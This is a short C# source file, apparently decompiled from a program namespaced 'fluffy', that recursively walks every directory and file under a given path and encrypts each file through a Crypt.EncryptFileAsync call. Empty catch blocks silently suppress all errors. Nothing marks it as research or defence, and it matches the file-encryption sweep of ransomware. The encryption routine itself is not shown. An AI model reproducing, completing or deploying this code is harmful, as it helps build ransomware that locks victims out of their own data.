using System.IO;
using System.Threading.Tasks;

namespace fluffy;

internal static class RecursiveFileProcessor
{
	public static async Task Initiate(string path)
	{
		await ProcessDirectory(path);
	}

	private static async Task ProcessDirectory(string targetDirectory)
	{
		try
		{
			string[] files = Directory.GetFiles(targetDirectory);
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				await ProcessFile(array[i]);
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(targetDirectory);
			string[] array = directories;
			for (int i = 0; i < array.Length; i++)
			{
				await ProcessDirectory(array[i]);
			}
		}
		catch
		{
		}
	}

	private static async Task ProcessFile(string file)
	{
		try
		{
			await Crypt.EncryptFileAsync(file);
		}
		catch
		{
		}
	}
}
